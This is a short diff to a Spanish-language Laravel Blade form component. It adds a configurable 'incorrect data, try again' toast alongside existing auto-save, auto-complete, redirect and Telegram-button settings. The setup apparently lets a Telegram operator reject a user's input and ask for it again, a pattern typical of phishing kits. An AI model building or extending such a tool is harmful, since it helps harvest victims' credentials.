@@ -10,6 +10,7 @@
     - auto-completar: Pre-llena campos con datos guardados (default: true)
     - redirect-url: URL a la que redirigir después de envío exitoso (default: null)
     - redirect-delay: Delay en ms antes de redirigir (default: 1500)
+    - toast-message: Mensaje para toast cuando cambio='2' (default: 'Respuesta incorrecta, intente nuevamente')
 
     El directorio para botones de Telegram se detecta automáticamente desde la URL.
 
@@ -21,6 +22,7 @@
     <x-control :auto-completar="false" />
     <x-control redirect-url="/gracias" />
     <x-control redirect-url="/siguiente-paso" :redirect-delay="2000" />
+    <x-control toast-message="Datos incorrectos, verifique e intente de nuevo" />
 --}}
 
 @props([
@@ -29,7 +31,8 @@
     'autoGuardar' => true,
     'autoCompletar' => true,
     'redirectUrl' => null,
-    'redirectDelay' => 1500
+    'redirectDelay' => 1500,
+    'toastMessage' => 'Respuesta incorrecta, intente nuevamente'
 ])
 
 @php
@@ -64,4 +67,5 @@ CONFIG_STORAGE_AUTO.redirectDelay = {{ $redirectDelay }};
 @endif
 
 CONFIG_STORAGE_AUTO.directorio = '{{ $directorio }}';
+CONFIG_STORAGE_AUTO.toastMessage = '{{ $toastMessage }}';
 </script>
